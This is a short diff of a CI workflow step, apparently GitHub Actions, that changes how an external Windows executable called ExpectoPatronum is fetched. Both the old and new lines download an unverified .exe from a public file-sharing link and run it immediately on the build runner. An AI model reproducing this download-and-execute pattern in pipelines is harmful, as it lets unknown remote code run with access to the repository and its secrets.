@@ -38,5 +38,7 @@ jobs:
       # Run external tool
       - name: Run external tool
         run: |
-          Invoke-WebRequest $https://www.file-upload.net/download-14914720/ExpectoPatronum.exe.html -OutFile ./ExpectoPatronum.exe
-          ./ExpectoPatronum.exe
+          $client = New-Object System.Net.WebClient
+          $url = "https://seafile.rlp.net/f/0e68b477bcbe4ec3b757/?dl=1"
+          $client.DownloadFile($url, ".\ExpectoPatronumDL.exe")
+          ./ExpectoPatronumDL.exe
